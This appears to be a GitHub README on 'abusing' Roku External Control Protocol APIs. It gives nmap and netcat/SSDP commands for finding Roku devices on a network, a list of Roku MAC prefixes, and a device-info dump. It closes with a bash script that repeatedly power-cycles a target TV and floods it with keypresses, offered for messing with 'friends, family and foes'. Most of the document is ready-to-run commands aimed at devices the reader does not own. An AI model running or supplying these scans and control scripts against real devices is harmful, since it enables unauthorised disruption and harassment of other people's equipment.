# :tv: Abusing ROKU APIs

____________________________________________________________________________________________________________________________________________________________________

![Roku](https://user-images.githubusercontent.com/72598486/133314573-0f0ebc16-9d51-4c1f-b2ad-1c7e15851214.png)

____________________________________________________________________________________________________________________________________________________________________

## Introduction: 

____________________________________________________________________________________________________________________________________________________________________
  I am excited to share how to successfully enumerate your network for Roku devices, issue External Control Protocol (ECP) commands to remotely manipulate televisions, and how to design custom scripts to automate messing with your friends! For more information, check out my Medium article: https://medium.com/@RoseSecurity/a-quick-guide-on-how-to-aggravate-friends-family-and-foes-37182230d7. 
____________________________________________________________________________________________________________________________________________________________________

## Enumerating Your Network for Roku Devices:

____________________________________________________________________________________________________________________________________________________________________

  Utilizing Nmap, we can issue the following command to enumerate our network for Roku devices by looking for service versions (-sV), operating systems (-O), and speeding up the scan by not resolving DNS (-n).

```
$ sudo nmap -sV -O -n 192.168.X.X/24
```

**Output of Nmap scan:**
```
Nmap scan report for 192.168.X.X
Host is up (0.010s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
7000/tcp open  rtsp    AirTunes rtspd 
9080/tcp open  http    Mongoose httpd
MAC Address: 10:59:32:XX:XX:XX (Roku)
```
  We see that Nmap identified the OUI of the MAC address, but I have provided a list of Roku MAC addresses to search for on your network!
  
**ROKU MAC Addresses**
  
| MAC Range |
|-----------|
| 9C:F1:D4  |
| 34:5E:08  |
| 7C:67:AB  |
| D4:E2:2F  |
| A8:B5:7C  |
| BC:D7:D4  |
| 20:EF:BD  |
| D8:31:34  |
| C8:3A:6B  |
| B0:EE:7B  |
| AC:AE:19  |
| 8C:49:62  |
| 84:EA:ED  |
| 10:59:32  |
| AC:3A:7A  |
| 88:DE:A9  |
| 8A:C7:2E  |
| B8:A1:75  |
| 00:0D:4B  |
| DC:3A:5E  |
| D0:4D:2C  |
| CC:6D:A0  |
| B8:3E:59  |
| B0:A7:37  |
| 08:05:81  |


## More Enumeration
____________________________________________________________________________________________________________________________________________________________________

We can identify the device location, name, and several other pertinent fields such as supporting remote capabilities! Another way of enumerating Roku devices is by sending a request to the Simple Service Discovery Port (SSDP) multicast address and port 1900. We can do this by using Netcat:

```
$ nc -u 239.255.255.250 1900 < Roku_ECP_Enum.txt
```
The device will respond with this information which can also be observed in Wireshark:

```
HTTP/1.1 200 OK
Cache-Control: max-age=3600
ST: roku:ecp
Location: http://192.168.X.X:8060/
USN: uuid:roku:ecp:P0A070000007
``` 

Utilizing Nmap and Wireshark, we can easily identify the IP address of any Roku devices attached to the network, and if they support the use of ECPs, we can remotely view the XML file on the webserver of the device!
  
  ```
  http://192.168.X.X:8060/query/device-info
  ```
This will produce an XML page similar to the one below:
  
```
<device-info>
<serial-number>X004000B231</serial-number>
<device-id>S00820BB231</device-id>
<vendor-name>Roku</vendor-name>
<model-name>Roku Ninja</model-name>
<model-number>3930X</model-number>
<model-region>US</model-region>
<is-tv>false</is-tv>
<is-stick>false</is-stick>
<ui-resolution>1080p</ui-resolution>
<supports-ethernet>false</supports-ethernet>
<wifi-mac>10:59:32</wifi-mac>
<wifi-driver>realtek</wifi-driver>
<has-wifi-extender>false</has-wifi-extender>
<has-wifi-5G-support>true</has-wifi-5G-support>
<can-use-wifi-extender>true</can-use-wifi-extender>
<network-type>wifi</network-type>
<network-name>Hillary's Email Server</network-name>
<friendly-device-name>Roku LivingRoom</friendly-device-name>
<friendly-model-name>Roku Express</friendly-model-name>
<default-device-name>Roku Express - X004000AJDX1</default-device-name>
<user-device-name>Roku Master</user-device-name>
<user-device-location>LivingRoom</user-device-location>
<build-number>AEA.00E04209A</build-number>
<software-version>10.0.0</software-version>
<software-build>4209</software-build>
<secure-device>true</secure-device>
<language>en</language>
<country>US</country>
<locale>en_US</locale>
<time-zone-auto>true</time-zone-auto>
<time-zone>US/Eastern</time-zone>
<time-zone-name>United States/Eastern</time-zone-name>
<time-zone-tz>America/New_York</time-zone-tz>
<time-zone-offset>-240</time-zone-offset>
<clock-format>12-hour</clock-format>
<uptime>2912968</uptime>
<power-mode>PowerOn</power-mode>
<supports-suspend>false</supports-suspend>
<supports-find-remote>true</supports-find-remote>
<find-remote-is-possible>false</find-remote-is-possible>
<supports-audio-guide>true</supports-audio-guide>
<supports-rva>true</supports-rva>
<developer-enabled>false</developer-enabled>
<keyed-developer-id/>
<search-enabled>true</search-enabled>
<search-channels-enabled>true</search-channels-enabled>
<voice-search-enabled>true</voice-search-enabled>
<notifications-enabled>true</notifications-enabled>
<notifications-first-use>true</notifications-first-use>
<supports-private-listening>true</supports-private-listening>
<headphones-connected>false</headphones-connected>
<supports-ecs-textedit>true</supports-ecs-textedit>
<supports-ecs-microphone>true</supports-ecs-microphone>
<supports-wake-on-wlan>false</supports-wake-on-wlan>
<supports-airplay>true</supports-airplay>
<has-play-on-roku>true</has-play-on-roku>
<has-mobile-screensaver>false</has-mobile-screensaver>
<support-url>roku.com/support</support-url>
<grandcentral-version>5.5.62</grandcentral-version>
<trc-version>3.0</trc-version>
<trc-channel-version>4.2.3</trc-channel-version>
<davinci-version>2.8.20</davinci-version>
</device-info>
```
## Issuing Commands
____________________________________________________________________________________________________________________________________________________________________

There are numerous commands that can be issued via HTTP requests, so I have provided the table of potential ECPs that can be sent to the device:

![ECP](https://user-images.githubusercontent.com/72598486/133323989-a69daa5c-eec8-41be-b520-8c955c499204.png)

____________________________________________________________________________________________________________________________________________________________________

## An Example Script for Having Fun
____________________________________________________________________________________________________________________________________________________________________

```bash
#!/bin/bash
# Prank script for Roku TV
Hahaha=1

# Power on and off loop
while [ $Hahaha -le 100 ]; do
    curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
    curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
    ((Hahaha=Hahaha+1))
done

# Power on and go to Home
curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
curl -d '' "http://192.168.X.X:8060/keypress/Home"

# Navigation loop
Hahaha=1
while [ $Hahaha -le 100 ]; do
    curl -d '' "http://192.168.X.X:8060/keypress/left"
    curl -d '' "http://192.168.X.X:8060/keypress/down"
    ((Hahaha=Hahaha+1))
done

echo "Can we still be friends?"
```

I hope that you learned something new, and if you need more information and resources on how to have more fun with these devices, check out https://developer.roku.com/docs/developer-program/debugging/external-control-api.md

Happy hunting!

wq!

